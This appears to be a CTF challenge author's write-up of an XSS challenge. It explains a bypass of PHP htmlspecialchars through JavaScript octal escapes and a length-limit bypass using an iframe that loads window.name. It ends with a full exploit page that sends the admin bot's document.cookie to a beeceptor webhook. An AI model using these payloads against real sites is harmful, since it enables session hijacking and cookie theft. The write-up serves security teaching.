### Hello everyone, this is my writeup for my web challenge " Xss 3 " that had no solves in JIS CTF 2023 and CAT CTF 23 

![image](https://github.com/abdoghazy2015/CTF-Write-Ups/assets/64314534/639ccff8-e4fb-40c3-a5ce-dbeec301f48b)

### When we open the link you will find "Enter your name " and after you send it as /?name=ghazy you will get this : 

![image](https://github.com/abdoghazy2015/CTF-Write-Ups/assets/64314534/408207b2-30aa-4499-98bc-01a9caaa4e6a)

### Since we can clearly see our input reflected in the page so, let's try a basic payload like 
`<img src=x onerror=alert() >`  

### And we will got our input as it 

![image](https://github.com/abdoghazy2015/CTF-Write-Ups/assets/64314534/eafb90e6-0f92-48fe-89fd-4866c4cd2130)

### Seems filtered right ? so, let's open the html source to see what happened to our payload in the reflection 

![image](https://github.com/abdoghazy2015/CTF-Write-Ups/assets/64314534/a4d89393-7de3-4945-ad7e-1aa048ebd063)

### If u tried to drop some error by sending `name` parameter as an array you will get this error 

![image](https://github.com/abdoghazy2015/CTF-Write-Ups/assets/64314534/a68e2425-a3e9-4efb-b1f3-ac8ea2e142b3)

### So, it's become clear now why our payload is filtered !! because our input is being passed to htmlspecialchars php function

> This function filters the html special chars like : [< , > , ' , " , &] in it's default configuration.

### So, this function is safe from bypassing ! 

### But after some hours since no one solved it, i released a hint .

![image](https://github.com/abdoghazy2015/CTF-Write-Ups/assets/64314534/2eee0214-63aa-4c78-8f20-b6f9ba3c1000)

### As we see in the response our input is being reflected on a js variable ! 
### So, let's see how we can use it to bypass htmlspecialchars

### If you opened your browser console and tried this :

![image](https://github.com/abdoghazy2015/CTF-Write-Ups/assets/64314534/9b448b0f-fb3a-44ff-8d8e-148c64919373)

### As you can see we can write a string by hex escaping using js like any programming / scripting languages ! 

### And since our input will be reflected at the js variable and the js code will print it in the page So, it should work !

![image](https://github.com/abdoghazy2015/CTF-Write-Ups/assets/64314534/3dc68b74-15b7-49e3-aad6-2c40bd59d4dd)


### let's try to test it in our challenge

![image](https://github.com/abdoghazy2015/CTF-Write-Ups/assets/64314534/238c6305-6ee2-482f-885b-5cfb713a7ffa)

![image](https://github.com/abdoghazy2015/CTF-Write-Ups/assets/64314534/7f5c5742-f510-48cb-9f21-8d37717a4527)

### As you can see both of them are filtered !! 

### Seems like the developer read about them in documents and filtered them and that what makes it a real life case : ) 

![image](https://github.com/abdoghazy2015/CTF-Write-Ups/assets/64314534/82c823ca-7982-4ab5-9b34-12fd489b1db8)


### Then what about using an old escaping that has been deprecated from the js docs : D 

### Yup it's called Octal escpaing. 

> We can escape octals in strings by just using `\`

![image](https://github.com/abdoghazy2015/CTF-Write-Ups/assets/64314534/7c9457b5-1dca-4565-a02f-77a52b34b135)


### TBH, i got it while i was debugging my challenge i wasn't know it before : D

### I wrote a simple for loop to print all chars to figure our what's this escaping and after that i knew it's octal : ) 

### So, let's try to escape our html special chars like : [<,>]

> Our Payload : \74img src=x onerror=alert()\76

### And bingoooo, we got our xss !

![image](https://github.com/abdoghazy2015/CTF-Write-Ups/assets/64314534/dd303692-266a-43a4-99d7-afa0e85adb48)


### But the problem is we had only 38 chars as a length limit ! So, we can't write a pyload like this to steal the admin cookies:

```javascript

<Script>fetch('http://webhook/?c='+document.cookie)</script>
```

### It's more than 38 chars for sure ! 

### There are many ways to bypass the length limit like : window.open or 13.rs domain : D

### We will use window.open

> In js we can open a new window and control some variables like it's name !

### What about trying to eval our window.name that we will control !

### Like this 

![image](https://github.com/abdoghazy2015/CTF-Write-Ups/assets/64314534/5b87e6fb-ef68-49e0-8859-f177af611269)


### Since our payload length passed 40 chars so it will not work also : ( 

### So, we need to do it in a smart way : D , like eval without using eval 

### If anyone searched about tiny xss payloads he will see this 

![image](https://github.com/abdoghazy2015/CTF-Write-Ups/assets/64314534/d78bcb57-4e3d-4621-bff0-43fef076a3b4)

`<iframe/onload=src=top.name>` 

> This payload will refer the iframe src to be the top window name : ) and since we can get xss using iframe src from this payload

```javascript

<iframe src=javascript:alert()>
```

### So, let's exploit this in our side to get alert : )

![image](https://github.com/abdoghazy2015/CTF-Write-Ups/assets/64314534/fefb4571-539f-4c1b-9d67-fb0158bba780)

### After bypassing the limit we can use this code to get the admin cookies !

```
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <Script>window.open('http://127.0.0.1/xss3/?name=\\74iframe/onload=src=top.name\\76','javascript:fetch(\'https://dummmmmmmyyyyy.free.beeceptor.com/?c=\'+document.cookie)')</Script>
<p id="a"></p>
<script>a.innerHTML="b";</script>
</body>
</html>

```

### Just host it in any web hook like beeceptor and send it to the bot like this
![image](https://github.com/abdoghazy2015/CTF-Write-Ups/assets/64314534/67634f37-645f-49e5-8080-67b8efa61caa)

### And we got the flag : )

![image](https://github.com/abdoghazy2015/CTF-Write-Ups/assets/64314534/d5333978-0e2a-4a2d-bb3b-08c7ab0cb507)


# Thanks for Reading and hope u enjoyed and learned from  it !
